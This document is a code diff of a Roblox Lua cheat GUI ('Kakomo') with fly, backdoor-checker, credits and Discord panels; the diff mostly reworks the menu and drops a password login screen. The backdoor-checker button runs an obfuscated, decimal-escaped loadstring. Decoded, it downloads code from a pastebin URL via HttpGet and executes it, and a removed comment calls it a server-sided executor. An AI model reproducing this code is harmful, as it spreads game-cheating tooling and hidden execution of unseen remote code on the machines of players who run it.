@@ -1,8 +1,4 @@
 local Kakomo = Instance.new("ScreenGui")
-local Lmao = Instance.new("Frame")
-local ImageLabel = Instance.new("ImageLabel")
-local TextButton = Instance.new("TextButton")
-local TextBox = Instance.new("TextBox")
 local Frame = Instance.new("Frame")
 local homt = Instance.new("ImageLabel")
 local Scripts = Instance.new("Frame")
@@ -15,86 +11,35 @@ local Fly_2 = Instance.new("TextLabel")
 local Credits = Instance.new("Frame")
 local CreditLabel = Instance.new("TextLabel")
 local Discord = Instance.new("Frame")
-local TextBox_2 = Instance.new("TextBox")
+local TextBox = Instance.new("TextBox")
 local Home = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
 local TextLabel_2 = Instance.new("TextLabel")
-local ImageLabel_2 = Instance.new("ImageLabel")
+local ImageLabel = Instance.new("ImageLabel")
 local XLabel_3 = Instance.new("ImageLabel")
 local Close = Instance.new("TextButton")
-local ScrollingFrame = Instance.new("ScrollingFrame")
-local Home_2 = Instance.new("ImageLabel")
-local HomeButton = Instance.new("TextButton")
-local Credits_2 = Instance.new("ImageLabel")
+local CredtsS = Instance.new("ImageLabel")
 local CreditsButton = Instance.new("TextButton")
-local Discord_2 = Instance.new("ImageLabel")
-local DiscordButton = Instance.new("TextButton")
-local Scripts_2 = Instance.new("ImageLabel")
-local ScriptButton = Instance.new("TextButton")
-local HomeLabel = Instance.new("TextLabel")
 local CreditsLabel = Instance.new("TextLabel")
+local DisordS = Instance.new("ImageLabel")
+local DiscordButton = Instance.new("TextButton")
 local DiscordLabel = Instance.new("TextLabel")
+local HmeS = Instance.new("ImageLabel")
+local HomeButton = Instance.new("TextButton")
+local HomeLabel = Instance.new("TextLabel")
+local SciptsS = Instance.new("ImageLabel")
+local ScriptButton = Instance.new("TextButton")
 local ScriptsLabel = Instance.new("TextLabel")
  
 Kakomo.Name = "Kakomo"
 Kakomo.Parent = game.CoreGui
 Kakomo.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-Kakomo.Draggable = true
-Kakomo.Active = true
-
-
-Lmao.Name = "Lmao"
-Lmao.Parent = Kakomo
-Lmao.BackgroundColor3 = Color3.new(1, 1, 1)
-Lmao.BackgroundTransparency = 1
-Lmao.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-Lmao.LayoutOrder = 1
-Lmao.Position = UDim2.new(0.372363627, 0, 0.314049631, 0)
-Lmao.Size = UDim2.new(0, 359, 0, 225)
-Lmao.ZIndex = 9
-
-ImageLabel.Parent = Lmao
-ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
-ImageLabel.BackgroundTransparency = 1
-ImageLabel.Position = UDim2.new(0.224659532, -125, 0.0691703409, -25)
-ImageLabel.Size = UDim2.new(0, 439, 0, 288)
-ImageLabel.Image = "rbxassetid://605740338"
-ImageLabel.ImageColor3 = Color3.new(0.0941177, 0.156863, 0.254902)
-ImageLabel.ScaleType = Enum.ScaleType.Slice
-ImageLabel.SliceCenter = Rect.new(24, 24, 216, 216)
-
-TextButton.Parent = ImageLabel
-TextButton.BackgroundColor3 = Color3.new(0.0666667, 1, 0)
-TextButton.BorderSizePixel = 0
-TextButton.Position = UDim2.new(0.279428959, 0, 0.735330701, 0)
-TextButton.Size = UDim2.new(0, 193, 0, 37)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.Text = "Login."
-TextButton.TextColor3 = Color3.new(1, 1, 1)
-TextButton.TextScaled = true
-TextButton.TextSize = 14
-TextButton.TextStrokeTransparency = 0
-TextButton.TextWrapped = true
-
-TextBox.Parent = ImageLabel
-TextBox.BackgroundColor3 = Color3.new(0.32549, 0.32549, 0.32549)
-TextBox.Position = UDim2.new(0.109418459, 0, 0.218972623, 0)
-TextBox.Size = UDim2.new(0, 342, 0, 50)
-TextBox.Font = Enum.Font.SourceSans
-TextBox.Text = ""
-TextBox.TextColor3 = Color3.new(1, 1, 1)
-TextBox.TextScaled = true
-TextBox.TextSize = 14
-TextBox.TextStrokeColor3 = Color3.new(1, 0.933333, 0)
-TextBox.TextStrokeTransparency = 0
-TextBox.TextWrapped = true
 
 Frame.Parent = Kakomo
 Frame.BackgroundColor3 = Color3.new(1, 1, 1)
 Frame.BackgroundTransparency = 1
 Frame.Position = UDim2.new(0.179636344, 0, 0.214876026, 0)
 Frame.Size = UDim2.new(0, 436, 0, 289)
-Frame.Visible = false
 
 homt.Name = "homt"
 homt.Parent = Frame
@@ -208,7 +153,6 @@ FlyE.MouseButton1Down:connect(function()
 	Fly()
 end)
 
-
 XLabel.Name = "X Label"
 XLabel.Parent = FlyE
 XLabel.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
@@ -244,14 +188,8 @@ Backdoorchecker.Font = Enum.Font.SourceSans
 Backdoorchecker.TextColor3 = Color3.new(0, 0, 0)
 Backdoorchecker.TextSize = 14
 Backdoorchecker.MouseButton1Down:connect(function()
-	--[[
-Server Sided executor by Novik#5516
-Showcase: https://gyazo.com/bad0a3f43d89c59aef28bd2220c9ef79
-Enjoy!
-]]
 	loadstring('\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\72\101\67\102\65\82\50\114\39\44\116\114\117\101\41\41\40\41')()
 end)
-
 
 XLabel_2.Name = "X Label"
 XLabel_2.Parent = Backdoorchecker
@@ -306,15 +244,15 @@ Discord.Position = UDim2.new(0.271070629, 0, 0.013888889, 0)
 Discord.Size = UDim2.new(0, 274, 0, 261)
 Discord.Visible = false
 
-TextBox_2.Parent = Discord
-TextBox_2.BackgroundColor3 = Color3.new(0.819608, 0.819608, 0.819608)
-TextBox_2.BackgroundTransparency = 0.20000000298023
-TextBox_2.Size = UDim2.new(0, 200, 0, 50)
-TextBox_2.ClearTextOnFocus = false
-TextBox_2.Font = Enum.Font.SourceSans
-TextBox_2.Text = "https://discord.gg/Yfy8ckqEhn"
-TextBox_2.TextColor3 = Color3.new(0, 0, 0)
-TextBox_2.TextSize = 14
+TextBox.Parent = Discord
+TextBox.BackgroundColor3 = Color3.new(0.819608, 0.819608, 0.819608)
+TextBox.BackgroundTransparency = 0.20000000298023
+TextBox.Size = UDim2.new(0, 200, 0, 50)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = "discord.gg/Yfy8ckqEhn"
+TextBox.TextColor3 = Color3.new(0, 0, 0)
+TextBox.TextSize = 14
 
 Home.Name = "Home"
 Home.Parent = homt
@@ -347,11 +285,11 @@ TextLabel_2.TextScaled = true
 TextLabel_2.TextSize = 14
 TextLabel_2.TextWrapped = true
 
-ImageLabel_2.Parent = Home
-ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
-ImageLabel_2.Position = UDim2.new(0.343065679, 0, 0.402985096, 0)
-ImageLabel_2.Size = UDim2.new(0, 76, 0, 69)
-ImageLabel_2.Image = "rbxassetid://2949511148"
+ImageLabel.Parent = Home
+ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel.Position = UDim2.new(0.343065679, 0, 0.402985096, 0)
+ImageLabel.Size = UDim2.new(0, 76, 0, 69)
+ImageLabel.Image = "rbxassetid://2949511148"
 
 XLabel_3.Name = "X Label"
 XLabel_3.Parent = Frame
@@ -378,50 +316,25 @@ Close.TextColor3 = Color3.new(0, 0, 0)
 Close.TextScaled = true
 Close.TextSize = 14
 Close.TextWrapped = true
+Close.MouseButton1Down:connect(function()
+	Frame.Visible = false        
+end)
 
-ScrollingFrame.Parent = Frame
-ScrollingFrame.Active = true
-ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
-ScrollingFrame.BackgroundTransparency = 1
-ScrollingFrame.Position = UDim2.new(-0.00419721706, 0, 0, 0)
-ScrollingFrame.Size = UDim2.new(0, 118, 0, 287)
 
-Home_2.Name = "Home"
-Home_2.Parent = ScrollingFrame
-Home_2.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
-Home_2.BackgroundTransparency = 1
-Home_2.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
-Home_2.Position = UDim2.new(1.10950911, -125, 0.0487013981, -25)
-Home_2.Size = UDim2.new(0, 95, 0, 39)
-Home_2.Image = "rbxassetid://605740338"
-Home_2.ImageColor3 = Color3.new(0.94902, 0.192157, 1)
-Home_2.ScaleType = Enum.ScaleType.Slice
-Home_2.SliceCenter = Rect.new(24, 24, 216, 216)
+CredtsS.Name = "CredtsS"
+CredtsS.Parent = Frame
+CredtsS.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
+CredtsS.BackgroundTransparency = 1
+CredtsS.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
+CredtsS.Position = UDim2.new(0.292995334, -125, 0.283995539, -25)
+CredtsS.Size = UDim2.new(0, 99, 0, 39)
+CredtsS.Image = "rbxassetid://605740338"
+CredtsS.ImageColor3 = Color3.new(0.94902, 0.192157, 1)
+CredtsS.ScaleType = Enum.ScaleType.Slice
+CredtsS.SliceCenter = Rect.new(24, 24, 216, 216)
 
-HomeButton.Name = "Home Button"
-HomeButton.Parent = Home_2
-HomeButton.BackgroundColor3 = Color3.new(1, 1, 1)
-HomeButton.BackgroundTransparency = 1
-HomeButton.Size = UDim2.new(0, 94, 0, 38)
-HomeButton.Font = Enum.Font.SourceSans
-HomeButton.Text = ""
-HomeButton.TextColor3 = Color3.new(0, 0, 0)
-HomeButton.TextSize = 14
-
-Credits_2.Name = "Credits"
-Credits_2.Parent = ScrollingFrame
-Credits_2.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
-Credits_2.BackgroundTransparency = 1
-Credits_2.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
-Credits_2.Position = UDim2.new(1.10950911, -125, 0.142127007, -25)
-Credits_2.Size = UDim2.new(0, 95, 0, 39)
-Credits_2.Image = "rbxassetid://605740338"
-Credits_2.ImageColor3 = Color3.new(0.94902, 0.192157, 1)
-Credits_2.ScaleType = Enum.ScaleType.Slice
-Credits_2.SliceCenter = Rect.new(24, 24, 216, 216)
-
-CreditsButton.Name = "Credits Button"
-CreditsButton.Parent = Credits_2
+CreditsButton.Name = "CreditsButton"
+CreditsButton.Parent = CredtsS
 CreditsButton.BackgroundColor3 = Color3.new(1, 1, 1)
 CreditsButton.BackgroundTransparency = 1
 CreditsButton.Size = UDim2.new(0, 94, 0, 38)
@@ -429,21 +342,42 @@ CreditsButton.Font = Enum.Font.SourceSans
 CreditsButton.Text = ""
 CreditsButton.TextColor3 = Color3.new(0, 0, 0)
 CreditsButton.TextSize = 14
+CreditsButton.MouseButton1Down:connect(function()
+	Credits.Visible = true        
+	Discord.Visible = false
+	Scripts.Visible = false
+	Home.Visible    = false
+end)
 
-Discord_2.Name = "Discord"
-Discord_2.Parent = ScrollingFrame
-Discord_2.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
-Discord_2.BackgroundTransparency = 1
-Discord_2.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
-Discord_2.Position = UDim2.new(1.10950911, -125, 0.240742922, -25)
-Discord_2.Size = UDim2.new(0, 95, 0, 39)
-Discord_2.Image = "rbxassetid://605740338"
-Discord_2.ImageColor3 = Color3.new(0.94902, 0.192157, 1)
-Discord_2.ScaleType = Enum.ScaleType.Slice
-Discord_2.SliceCenter = Rect.new(24, 24, 216, 216)
 
-DiscordButton.Name = "Discord Button"
-DiscordButton.Parent = Discord_2
+
+CreditsLabel.Name = "Credits Label"
+CreditsLabel.Parent = CredtsS
+CreditsLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+CreditsLabel.BackgroundTransparency = 1
+CreditsLabel.Position = UDim2.new(0.0798664689, 0, 0.020555675, 0)
+CreditsLabel.Size = UDim2.new(0, 87, 0, 38)
+CreditsLabel.Font = Enum.Font.SourceSans
+CreditsLabel.Text = "Credits"
+CreditsLabel.TextColor3 = Color3.new(0, 0, 0)
+CreditsLabel.TextScaled = true
+CreditsLabel.TextSize = 14
+CreditsLabel.TextWrapped = true
+
+DisordS.Name = "DisordS"
+DisordS.Parent = Frame
+DisordS.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
+DisordS.BackgroundTransparency = 1
+DisordS.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
+DisordS.Position = UDim2.new(0.302169681, -125, 0.655967832, -25)
+DisordS.Size = UDim2.new(0, 95, 0, 39)
+DisordS.Image = "rbxassetid://605740338"
+DisordS.ImageColor3 = Color3.new(0.94902, 0.192157, 1)
+DisordS.ScaleType = Enum.ScaleType.Slice
+DisordS.SliceCenter = Rect.new(24, 24, 216, 216)
+
+DiscordButton.Name = "DiscordButton"
+DiscordButton.Parent = DisordS
 DiscordButton.BackgroundColor3 = Color3.new(1, 1, 1)
 DiscordButton.BackgroundTransparency = 1
 DiscordButton.Size = UDim2.new(0, 94, 0, 38)
@@ -451,31 +385,58 @@ DiscordButton.Font = Enum.Font.SourceSans
 DiscordButton.Text = ""
 DiscordButton.TextColor3 = Color3.new(0, 0, 0)
 DiscordButton.TextSize = 14
+DiscordButton.MouseButton1Down:connect(function()
+	Credits.Visible = false        
+	Discord.Visible = true
+	Scripts.Visible = false
+	Home.Visible    = false
+end)
 
-Scripts_2.Name = "Scripts"
-Scripts_2.Parent = ScrollingFrame
-Scripts_2.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
-Scripts_2.BackgroundTransparency = 1
-Scripts_2.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
-Scripts_2.Position = UDim2.new(1.10950911, -125, 0.328978211, -25)
-Scripts_2.Size = UDim2.new(0, 95, 0, 39)
-Scripts_2.Image = "rbxassetid://605740338"
-Scripts_2.ImageColor3 = Color3.new(0.94902, 0.192157, 1)
-Scripts_2.ScaleType = Enum.ScaleType.Slice
-Scripts_2.SliceCenter = Rect.new(24, 24, 216, 216)
 
-ScriptButton.Name = "Script Button"
-ScriptButton.Parent = Scripts_2
-ScriptButton.BackgroundColor3 = Color3.new(1, 1, 1)
-ScriptButton.BackgroundTransparency = 1
-ScriptButton.Size = UDim2.new(0, 94, 0, 38)
-ScriptButton.Font = Enum.Font.SourceSans
-ScriptButton.Text = ""
-ScriptButton.TextColor3 = Color3.new(0, 0, 0)
-ScriptButton.TextSize = 14
+DiscordLabel.Name = "Discord Label"
+DiscordLabel.Parent = DisordS
+DiscordLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+DiscordLabel.BackgroundTransparency = 1
+DiscordLabel.Position = UDim2.new(0.0701159835, 0, 0.0183375776, 0)
+DiscordLabel.Size = UDim2.new(0, 87, 0, 38)
+DiscordLabel.Font = Enum.Font.SourceSans
+DiscordLabel.Text = "Discord"
+DiscordLabel.TextColor3 = Color3.new(0, 0, 0)
+DiscordLabel.TextScaled = true
+DiscordLabel.TextSize = 14
+DiscordLabel.TextWrapped = true
+
+HmeS.Name = "HmeS"
+HmeS.Parent = Frame
+HmeS.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
+HmeS.BackgroundTransparency = 1
+HmeS.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
+HmeS.Position = UDim2.new(0.302169681, -125, 0.0971443057, -25)
+HmeS.Size = UDim2.new(0, 95, 0, 39)
+HmeS.Image = "rbxassetid://605740338"
+HmeS.ImageColor3 = Color3.new(0.94902, 0.192157, 1)
+HmeS.ScaleType = Enum.ScaleType.Slice
+HmeS.SliceCenter = Rect.new(24, 24, 216, 216)
+
+HomeButton.Name = "HomeButton"
+HomeButton.Parent = HmeS
+HomeButton.BackgroundColor3 = Color3.new(1, 1, 1)
+HomeButton.BackgroundTransparency = 1
+HomeButton.Size = UDim2.new(0, 94, 0, 38)
+HomeButton.Font = Enum.Font.SourceSans
+HomeButton.Text = ""
+HomeButton.TextColor3 = Color3.new(0, 0, 0)
+HomeButton.TextSize = 14
+HomeButton.MouseButton1Down:connect(function()
+	Credits.Visible = false        
+	Discord.Visible = false
+	Scripts.Visible = false
+	Home.Visible    = true
+end)
+
 
 HomeLabel.Name = "Home Label"
-HomeLabel.Parent = ScrollingFrame
+HomeLabel.Parent = HmeS
 HomeLabel.BackgroundColor3 = Color3.new(1, 1, 1)
 HomeLabel.BackgroundTransparency = 1
 HomeLabel.Position = UDim2.new(0.1101695, 0, 0.00751336012, 0)
@@ -487,37 +448,40 @@ HomeLabel.TextScaled = true
 HomeLabel.TextSize = 14
 HomeLabel.TextWrapped = true
 
-CreditsLabel.Name = "Credits Label"
-CreditsLabel.Parent = ScrollingFrame
-CreditsLabel.BackgroundColor3 = Color3.new(1, 1, 1)
-CreditsLabel.BackgroundTransparency = 1
-CreditsLabel.Position = UDim2.new(0.0762711912, 0, 0.0974787548, 0)
-CreditsLabel.Size = UDim2.new(0, 87, 0, 38)
-CreditsLabel.Font = Enum.Font.SourceSans
-CreditsLabel.Text = "Credits"
-CreditsLabel.TextColor3 = Color3.new(0, 0, 0)
-CreditsLabel.TextScaled = true
-CreditsLabel.TextSize = 14
-CreditsLabel.TextWrapped = true
+SciptsS.Name = "SciptsS"
+SciptsS.Parent = Frame
+SciptsS.BackgroundColor3 = Color3.new(1, 0.6, 0.6)
+SciptsS.BackgroundTransparency = 1
+SciptsS.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
+SciptsS.Position = UDim2.new(0.302169681, -125, 0.481227338, -25)
+SciptsS.Size = UDim2.new(0, 95, 0, 39)
+SciptsS.Image = "rbxassetid://605740338"
+SciptsS.ImageColor3 = Color3.new(0.94902, 0.192157, 1)
+SciptsS.ScaleType = Enum.ScaleType.Slice
+SciptsS.SliceCenter = Rect.new(24, 24, 216, 216)
 
-DiscordLabel.Name = "Discord Label"
-DiscordLabel.Parent = ScrollingFrame
-DiscordLabel.BackgroundColor3 = Color3.new(1, 1, 1)
-DiscordLabel.BackgroundTransparency = 1
-DiscordLabel.Position = UDim2.new(0.1101695, 0, 0.197824761, 0)
-DiscordLabel.Size = UDim2.new(0, 87, 0, 38)
-DiscordLabel.Font = Enum.Font.SourceSans
-DiscordLabel.Text = "Discord"
-DiscordLabel.TextColor3 = Color3.new(0, 0, 0)
-DiscordLabel.TextScaled = true
-DiscordLabel.TextSize = 14
-DiscordLabel.TextWrapped = true
+ScriptButton.Name = "ScriptButton"
+ScriptButton.Parent = SciptsS
+ScriptButton.BackgroundColor3 = Color3.new(1, 1, 1)
+ScriptButton.BackgroundTransparency = 1
+ScriptButton.Size = UDim2.new(0, 94, 0, 38)
+ScriptButton.Font = Enum.Font.SourceSans
+ScriptButton.Text = ""
+ScriptButton.TextColor3 = Color3.new(0, 0, 0)
+ScriptButton.TextSize = 14
+ScriptButton.MouseButton1Down:connect(function()
+	Credits.Visible = false        
+	Discord.Visible = false
+	Scripts.Visible = true
+	Home.Visible    = false
+end)
+
 
 ScriptsLabel.Name = "Scripts Label"
-ScriptsLabel.Parent = ScrollingFrame
+ScriptsLabel.Parent = SciptsS
 ScriptsLabel.BackgroundColor3 = Color3.new(1, 1, 1)
 ScriptsLabel.BackgroundTransparency = 1
-ScriptsLabel.Position = UDim2.new(0.1101695, 0, 0.286060065, 0)
+ScriptsLabel.Position = UDim2.new(0.078590557, 0, 0.00400876999, 0)
 ScriptsLabel.Size = UDim2.new(0, 87, 0, 38)
 ScriptsLabel.Font = Enum.Font.SourceSans
 ScriptsLabel.Text = "Scripts"
@@ -525,107 +489,4 @@ ScriptsLabel.TextColor3 = Color3.new(0, 0, 0)
 ScriptsLabel.TextScaled = true
 ScriptsLabel.TextSize = 14
 ScriptsLabel.TextWrapped = true
-
-script.Parent.MouseButton1Click:Connect(function()
-	if script.Parent.Parent.TextBox.Text == "gay" then ---- edit test with your code
-		script.Parent.Parent.Parent.Parent.Frame.Visible = true
-		wait(0)
-		script.Parent.Parent.Parent.Visible = false
-	end
-end)
-
-local ms = game.Players.LocalPlayer:GetMouse()
-
-local btn = script.Parent
-local sample = script:WaitForChild('Sample')
-
-btn.MouseButton1Click:Connect(function()
-	local c = sample:Clone()
-	c.Parent = btn
-	local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
-	c.Position = UDim2.new(0, x, 0, y)
-	local len, size = 0.35, nil
-	if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
-		size = (btn.AbsoluteSize.X * 1.5)
-	else
-		size = (btn.AbsoluteSize.Y * 1.5)
-	end
-	c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
-	for i = 1, 10 do
-		c.ImageTransparency = c.ImageTransparency + 0.05
-		wait(len / 12)
-	end
-	c:Destroy()
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.Frame.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Parent.Parent.homt.Home.Visible = true
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Discord.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Scripts.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Credits.Visible = false
-end)
-
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Credits.Visible = true
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Home.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Discord.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Scripts.Visible = false
-end)
-
-
-script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Parent.Parent.homt.Discord.Visible = true
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Home.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Scripts.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Credits.Visible = false
-end)
-
-
-script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Parent.Parent.homt.Scripts.Visible = true
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Home.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Discord.Visible = false
-end)
-
-script.Parent.MouseButton1Click:Connect(function()
-	script.Parent.Parent.Parent.Parent.homt.Credits.Visible = false
-end)
 
